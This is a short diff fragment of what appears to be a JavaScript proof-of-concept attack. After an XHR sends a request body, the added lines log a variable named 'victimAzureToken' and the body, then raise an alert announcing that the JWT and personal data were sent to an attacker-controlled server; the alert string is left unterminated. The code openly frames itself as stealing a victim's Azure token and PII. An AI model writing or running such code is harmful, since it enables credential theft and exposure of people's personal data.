@@ -42,6 +42,10 @@ xhr.onreadystatechange = function() {
 
 xhr.send(requestBody);
 
+console.log(victimAzureToken)
+console.log(requestBody)
+
+alert("ALL DONE - JWT AND PII SENT TO ATTACKER CONTROLLED SERVER - Please check console log for reference
 
 
 
